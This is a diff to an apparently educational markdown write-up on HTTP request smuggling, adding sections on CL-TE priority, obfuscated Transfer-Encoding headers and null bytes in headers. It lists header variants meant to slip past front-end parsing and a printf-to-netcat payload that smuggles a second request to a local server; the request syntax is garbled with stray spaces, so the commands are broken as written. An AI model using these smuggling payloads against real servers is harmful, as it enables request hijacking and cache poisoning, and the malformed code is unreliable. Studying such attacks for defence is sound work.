@@ -75,16 +75,21 @@ So smuggling
 
 Therefore. When we send a vague HTTP request to the proxy server, the proxy server may consider this to be an HTTP request, and then forward it to the backend origin server, but the origin server After parsing and processing, only a part of it is considered as a normal request is ‘accepted’ but this includes the remaining part smuggled request. When this part affects the request of a normal user, an HTTP smuggling attack is implemented.
 
-#### The Attack
+## The Attack
 
 Methodology: We know that both Content-Length and Transfer-Encoding can be used 
 as a way to process the body when transmitting POST data.    
  
+Some readers may see that this will have the same confusion as me. Is the RFC document not standardized for CL & TE parsing priorities? Yes, yes, see https://tools.ietf.org/html/rfc7230#section-3.3.3    
+
 Terms we’ll be using:
 `CL-TE` means that Front uses Content-Length first, and Backend gives priority to Transfer-Encoding.   
 `TE-CL` means that Front will give priority to Transfer-Encoding, and Backend will give priority to Content-Length.    
 
 In addition, Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following \r\n, CRLF is replaced by two bytes.
+
+### Chunks Priority On Content-Length
+
 	
 ```
 printf 'GET / HTTP / 1.1 \ r \ n' \
@@ -142,4 +147,53 @@ Dummy: Header [CRLF] (end of 56 bytes of body, not parsed)
 GET / tests HTTP / 1.1
 Host: localhost
 Dummy: Header
+```
+
+### Bad Chunked Transmission
+https://tools.ietf.org/html/rfc7230#section-3.3.3 as you can see In other words Transfer-Encoding: chunked, zorg, it should return a 400 error when it is received .    
+
+This type can be bypassed a lot, such as:
+```
+Transfer-Encoding : xchunked
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding : x
+
+Transfer-Encoding: [tab] chunked
+
+GET / HTTP / 1.1 Transfer-Encoding : chunked X : X [\ n] Transfer-Encoding: chunked
+ 
+
+
+Transfer-Encoding
+ : chunked
+```
+
+### Null in Headers 
+This problem is more likely to occur in some middleware servers written in C, because the `\0` end of string symbol is used in the header. If we use `\0` it , it may cause the middleware to parse abnormally. because of newlines...     
+
+For example:
+```
+# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body) 
+printf  'GET / HTTP / 1.1 \ r \ n' \ 
+'Host: localhost \ r \ n' \ 
+'Content- \ 0dummy: foo \ r \ n ' \ 
+' length: 56 \ r \ n ' \ 
+' Transfer-Encoding: chunked \ r \ n ' \ 
+' Dummy: Header \ r \ n ' \ 
+' \ r \ n ' \ 
+' 0 \ r \ n ' \ 
+' \ r \ n ' \ 
+' GET / tmp HTTP / 1.1 \ r \ n ' \ 
+' Host: localhost \ r \ n ' \ 
+' Dummy: Header \ r \ n ' \ 
+' \ r \ n ' \ 
+'GET / tests HTTP / 1.1 \ r \ n' \ 
+'Host: localhost \ r \ n'\ 
+'Dummy: Header \ r \ n' \ 
+'\ r \ n' \
+| nc -q3 127.0.0.1 8080
 ```
